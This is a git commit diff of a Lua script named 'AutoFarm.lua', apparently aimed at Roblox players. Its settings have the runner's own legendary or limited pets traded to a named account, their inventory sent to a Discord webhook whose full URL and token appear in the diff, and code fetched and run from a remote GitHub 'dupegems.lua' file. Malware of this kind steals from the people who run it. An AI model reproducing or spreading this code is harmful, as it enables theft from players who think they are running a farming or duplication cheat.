8382b1040b16d6d109e80f90d083ae6fe5ed92ed
nutsleyer <108308647+nutsleyer@users.noreply.github.com>
2022-07-01 02:19:15 -0400

    Update AutoFarm.lua

--- AutoFarm.lua
+++ AutoFarm.lua
@@ -2,5 +2,5 @@ PetRarity = "Legendary" -- Select Pet Rarity: Common Epic Legendary
 PetLimited = true -- If pet is limited it will take it!
 PetAll = false -- Will send all hes pets
 TradeUser = "rtertertertertedffgd" -- Write your username so it will send to you trade
-WebhookURL = "hhttps://discord.com/api/webhooks/992312301820588163/U0LD085gRPwdxfO-lJ7ppQyTtIse-pd8fXi9e3ejCD_97F8Sx8gKcWThLhzzsoi3WxEW" -- Your webhook so it sends user inventory if its bigger than 500 pets it won't send it will delete webhook.
+WebhookURL = "https://discord.com/api/webhooks/991849792923783239/aUThdigWPJLJFBuPap6xEhnffgKNohOGFwkjBU5yEwvi16A1quxmX1LY_8h7P6536mz7" -- Your webhook so it sends user inventory if its bigger than 500 pets it won't send it will delete webhook.
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua"))()
